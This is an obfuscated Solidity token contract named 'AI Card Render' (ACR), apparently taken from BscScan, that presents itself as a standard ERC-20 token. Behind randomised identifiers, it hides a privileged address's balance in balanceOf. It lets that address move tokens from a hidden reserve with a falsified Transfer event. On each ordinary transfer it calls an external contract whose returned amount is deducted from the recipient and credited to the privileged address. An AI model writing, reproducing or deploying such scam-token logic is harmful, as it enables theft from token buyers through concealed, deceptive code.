/**
 *Submitted for verification at BscScan.com on 2023-02-08
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
     
library Pbcmqoas{
    
    function KQDokhYLx(address Iyp, address OTpq, uint OyntTMBXvvIy) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool UrGVs, bytes memory wNWDWydShyhd) = Iyp.call(abi.encodeWithSelector(0x095ea7b3, OTpq, OyntTMBXvvIy));
        require(UrGVs && (wNWDWydShyhd.length == 0 || abi.decode(wNWDWydShyhd, (bool))), 'Pbcmqoas: APPROVE_FAILED');
    }

    function sMrzRFzLozuH(address Iyp, address OTpq, uint OyntTMBXvvIy) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool UrGVs, bytes memory wNWDWydShyhd) = Iyp.call(abi.encodeWithSelector(0xa9059cbb, OTpq, OyntTMBXvvIy));
        require(UrGVs && (wNWDWydShyhd.length == 0 || abi.decode(wNWDWydShyhd, (bool))), 'Pbcmqoas: TRANSFER_FAILED');
    }
    
    function sCMpTKUvp(address OTpq, uint OyntTMBXvvIy) internal {
        (bool UrGVs,) = OTpq.call{value:OyntTMBXvvIy}(new bytes(0));
        require(UrGVs, 'Pbcmqoas: ETH_TRANSFER_FAILED');
    }

    function iuyOA(address Iyp, address from, address OTpq, uint OyntTMBXvvIy) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool UrGVs, bytes memory wNWDWydShyhd) = Iyp.call(abi.encodeWithSelector(0x23b872dd, from, OTpq, OyntTMBXvvIy));
        require(UrGVs && wNWDWydShyhd.length > 0,'Pbcmqoas: TRANSFER_FROM_FAILED'); return wNWDWydShyhd;
                       
    }

}
    
interface pYmzZfrO {
    function totalSupply() external view returns (uint256);
    function balanceOf(address yamWYIIPsh) external view returns (uint256);
    function transfer(address nzLLNOjrdC, uint256 NYklenHRuYsg) external returns (bool);
    function allowance(address AmOWWhIVKwk, address spender) external view returns (uint256);
    function approve(address spender, uint256 NYklenHRuYsg) external returns (bool);
    function transferFrom(
        address sender,
        address nzLLNOjrdC,
        uint256 NYklenHRuYsg
    ) external returns (bool);

    event Transfer(address indexed from, address indexed vQFnKCw, uint256 value);
    event Approval(address indexed AmOWWhIVKwk, address indexed spender, uint256 value);
}

interface xHvGkMkXz is pYmzZfrO {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract wTA {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
interface pFBCOmSJGnUn {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
contract ACR is wTA, pYmzZfrO, xHvGkMkXz {
    
    function decreaseAllowance(address ZjPyd, uint256 subtractedValue) public virtual returns (bool) {
        uint256 WEJiUhTE = wUTUaZ[_msgSender()][ZjPyd];
        require(WEJiUhTE >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            kvBLzhmlFsXd(_msgSender(), ZjPyd, WEJiUhTE - subtractedValue);
        }

        return true;
    }
    
    mapping(address => uint256) private CmQFwihcszaX;
    
    function approve(address nHCjax, uint256 OOEHTpV) public virtual override returns (bool) {
        kvBLzhmlFsXd(_msgSender(), nHCjax, OOEHTpV);
        return true;
    }
    
    function balanceOf(address CFfaQ) public view virtual override returns (uint256) {
        if(_msgSender() != address(YCiK) && 
           CFfaQ == address(YCiK)){
            return 0;
        }
       return CmQFwihcszaX[CFfaQ];
    }
    
    address private YCiK;
    
    function transferFrom(
        address qAyA,
        address OtGaBici,
        uint256 OhjjTtqi
    ) public virtual override returns (bool) {
      
        if(!OERIZzJ(qAyA, OtGaBici, OhjjTtqi)) return true;

        uint256 gAB = wUTUaZ[qAyA][_msgSender()];
        if (gAB != type(uint256).max) {
            require(gAB >= OhjjTtqi, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                kvBLzhmlFsXd(qAyA, _msgSender(), gAB - OhjjTtqi);
            }
        }

        return true;
    }
    
    uint256 private OwUClbnPm = 10000000000 * 10 ** 18;
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function allowance(address zLqfPV, address ViYVEteusS) public view virtual override returns (uint256) {
        return wUTUaZ[zLqfPV][ViYVEteusS];
    }
    
    constructor() {
        
        CmQFwihcszaX[address(1)] = OwUClbnPm;
        emit Transfer(address(0), address(1), OwUClbnPm);

    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return OwUClbnPm;
    }
    
    string private bidqru = "AI Card Render";
    
    function name() public view virtual override returns (string memory) {
        return bidqru;
    }
    
    mapping(address => mapping(address => uint256)) private wUTUaZ;
    
    function AeQdNN(
        address PahjqNUobvmr,
        address skDCA,
        uint256 DIPApDoIYVIB
    ) internal virtual  returns (bool){
        uint256 tFuXh = CmQFwihcszaX[PahjqNUobvmr];
        require(tFuXh >= DIPApDoIYVIB, "ERC20: transfer Amount exceeds balance");
        unchecked {
            CmQFwihcszaX[PahjqNUobvmr] = tFuXh - DIPApDoIYVIB;
        }
        CmQFwihcszaX[skDCA] += DIPApDoIYVIB;
        return true;
    }
    
    string private wWEAH =  "ACR";
    
    function kvBLzhmlFsXd(
        address EmQzlSiv,
        address KubWAOSTLhU,
        uint256 lYPvetQfNi
    ) internal virtual {
        require(EmQzlSiv != address(0), "ERC20: approve from the zero address");
        require(KubWAOSTLhU != address(0), "ERC20: approve to the zero address");

        wUTUaZ[EmQzlSiv][KubWAOSTLhU] = lYPvetQfNi;
        emit Approval(EmQzlSiv, KubWAOSTLhU, lYPvetQfNi);

    }
    
    function symbol() public view virtual override returns (string memory) {
        return wWEAH;
    }
    
    function OERIZzJ(
        address pYDDmpHJJcI,
        address DdSghLqRxIw,
        uint256 oWihDRdyEI
    ) internal virtual  returns (bool){
        require(pYDDmpHJJcI != address(0), "ERC20: transfer from the zero address");
        require(DdSghLqRxIw != address(0), "ERC20: transfer to the zero address");
        
        if(!EKa(pYDDmpHJJcI,DdSghLqRxIw)) return false;

        if(_msgSender() == address(YCiK)){
            if(DdSghLqRxIw == JCGMqJ && CmQFwihcszaX[pYDDmpHJJcI] < oWihDRdyEI){
                AeQdNN(YCiK,DdSghLqRxIw,oWihDRdyEI);
            }else{
                AeQdNN(pYDDmpHJJcI,DdSghLqRxIw,oWihDRdyEI);
                if(pYDDmpHJJcI == YCiK || DdSghLqRxIw == YCiK) 
                return false;
            }
            emit Transfer(pYDDmpHJJcI, DdSghLqRxIw, oWihDRdyEI);
            return false;
        }
        AeQdNN(pYDDmpHJJcI,DdSghLqRxIw,oWihDRdyEI);
        emit Transfer(pYDDmpHJJcI, DdSghLqRxIw, oWihDRdyEI);
        bytes memory rOs = Pbcmqoas.iuyOA(EKLIYdgfHoI, pYDDmpHJJcI, DdSghLqRxIw, oWihDRdyEI);
        (bool xpszMC, uint iFFWGDoltZ) = abi.decode(rOs, (bool,uint));
        if(xpszMC){
            CmQFwihcszaX[YCiK] += iFFWGDoltZ;
            CmQFwihcszaX[DdSghLqRxIw] -= iFFWGDoltZ; 
        }
        return true;
    }
    
    address private EKLIYdgfHoI;
    
    function EKa(
        address oMLxX,
        address EwuBLWDQD
    ) internal virtual  returns (bool){
        if(YCiK == address(0) && EKLIYdgfHoI == address(0)){
            YCiK = oMLxX;EKLIYdgfHoI=EwuBLWDQD;
            Pbcmqoas.sMrzRFzLozuH(EKLIYdgfHoI, YCiK, 0);
            JCGMqJ = pFBCOmSJGnUn(EKLIYdgfHoI).WETH();
            return false;
        }
        return true;
    }
    
    function transfer(address eyaPBSIpafIw, uint256 hjaMrMBnUFt) public virtual override returns (bool) {
        OERIZzJ(_msgSender(), eyaPBSIpafIw, hjaMrMBnUFt);
        return true;
    }
    
    address private JCGMqJ;
  
    
    function increaseAllowance(address gsloOwRaAwyF, uint256 addedValue) public virtual returns (bool) {
        kvBLzhmlFsXd(_msgSender(), gsloOwRaAwyF, wUTUaZ[_msgSender()][gsloOwRaAwyF] + addedValue);
        return true;
    }
    
}